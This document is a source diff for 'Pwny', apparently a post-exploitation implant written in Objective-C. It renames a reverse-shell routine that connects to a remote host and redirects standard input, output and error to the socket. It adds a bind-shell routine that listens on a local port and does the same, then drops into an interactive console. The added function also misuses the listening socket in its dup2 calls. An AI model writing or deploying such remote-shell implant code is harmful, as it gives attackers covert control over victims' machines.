@@ -28,7 +28,8 @@
 #import "console.h"
 #import "utils.h"
 
-void connectToServer(NSString *remote_host, int remote_port);
+void listenServer(int remotePort);
+void connectServer(NSString *remote_host, int remote_port);
 
 int main(int argc, const char *argv[]) {
     @autoreleasepool {
@@ -52,7 +53,7 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
-void interactWithServer() {
+void interact() {
     Pwny *pwny = [[Pwny alloc] init];
     Console *console = [[Console alloc] init];
     Utils *utils = [[Utils alloc] init];
@@ -112,7 +113,34 @@ void interactWithServer() {
     }
 }
 
-void connectToServer(NSString *remoteHost, int remotePort) {
+void listenServer(int localPort) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1)
+        return;
+
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_addr.s_addr = INADDR_ANY;
+    hint.sin_port = htons(localPort);
+
+    if (bind(sock, (struct sockaddr*)&hint, sizeof(hint)) < 0)
+        return;
+
+    if (listen(sock, 10) < 0)
+        return;
+
+    auto addrlen = sizeof(hint);
+    int newsock = accept(sock, (struct sockaddr*)&hint, (socklen_t*)&addrlen);
+
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+
+    interact();
+    close(newsock);
+}
+
+void connectServer(NSString *remoteHost, int remotePort) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1)
         return;
@@ -129,6 +157,6 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     dup2(sock, 1);
     dup2(sock, 2);
 
-    interactWithServer();
+    interact();
     close(sock);
 }
